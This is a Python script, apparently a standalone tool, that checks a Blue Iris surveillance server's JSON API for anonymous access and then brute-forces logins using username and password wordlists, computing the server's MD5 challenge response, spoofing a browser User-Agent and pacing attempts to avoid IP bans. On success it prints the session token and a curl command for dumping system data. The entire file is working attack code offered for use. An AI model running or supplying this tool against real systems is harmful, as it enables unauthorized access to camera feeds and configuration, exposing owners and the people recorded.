#!/usr/bin/env python3
import requests
import hashlib
import argparse
import sys
import time
import gzip
import os

def md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

def load_wordlist(path):
    if not os.path.exists(path):
        print(f"[-] Wordlist not found: {path}")
        sys.exit(1)
    if path.endswith('.gz'):
        print(f"[+] Loading gzipped wordlist: {path}")
        with gzip.open(path, 'rt', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    else:
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]

def main():
    parser = argparse.ArgumentParser(description="Blue Iris Modern JSON Scanner & Brute-Forcer (c0nfigur3/BI-scanner)")
    parser.add_argument("-H", "--host", required=True, help="Target URL (e.g. http://REDACTED:81)")
    parser.add_argument("-u", "--users", default="users.txt", help="Username list (default: users.txt)")
    parser.add_argument("-p", "--passwords", default="passwords.txt", help="Password list — supports .txt or .gz (e.g. /usr/share/wordlists/rockyou.txt.gz)")
    parser.add_argument("-d", "--delay", type=int, default=2, help="Delay between attempts in seconds (default: 2)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    base_url = args.host.rstrip("/")
    print(f"[*] Targeting Blue Iris @ {base_url}\n")

    # Anonymous access check
    try:
        r = requests.post(f"{base_url}/json", json={"cmd": "login"}, timeout=10)
        data = r.json()
        if data.get("result") == "success":
            print("[+] SUCCESS! Anonymous access is permitted")
            print("[+] Full dump example: curl -X POST -d '{\"cmd\":\"system\"}' " + f"{base_url}/json")
            sys.exit(0)
    except:
        pass
    print("[-] Anonymous access is not permitted")

    # Load wordlists
    try:
        with open(args.users) as f:
            users = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        users = ["admin"]
        print("[!] users.txt not found — using default 'admin'")

    passwords = load_wordlist(args.passwords)

    print(f"[+] Brute forcing {len(users)} user(s) × {len(passwords):,} password(s)...\n")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

    for user in users:
        for pwd in passwords:
            if args.verbose:
                print(f"[*] Trying {user}:{pwd}")

            # Step 1: Get session ID
            try:
                r = session.post(f"{base_url}/json", json={"cmd": "login"}, timeout=10)
                resp = r.json()
                if resp.get("result") != "success":
                    continue
                sess_id = resp["session"]
            except:
                continue

            # Step 2: Correct Blue Iris MD5 = username:session:password
            response_hash = md5(f"{user}:{sess_id}:{pwd}")

            # Step 3: Send final login
            payload = {"cmd": "login", "session": sess_id, "response": response_hash}
            r = session.post(f"{base_url}/json", json=payload, timeout=10)

            try:
                resp = r.json()
                if resp.get("result") == "success":
                    print(f"\n[+] SUCCESS - {user}:{pwd}")
                    print(f"    Session token: {sess_id}")
                    print(f"    Full session ready for any JSON command (cameras, alerts, config, etc.)")
                    print(f"\n[+] Example: curl -X POST {base_url}/json -d '{{\"cmd\":\"system\",\"session\":\"{sess_id}\"}}'")
                    sys.exit(0)
            except:
                pass

            time.sleep(args.delay)  # Prevent IP ban

    print("[-] No luck with current wordlists. Try a larger one or expand users.txt.")

if __name__ == "__main__":
    main()
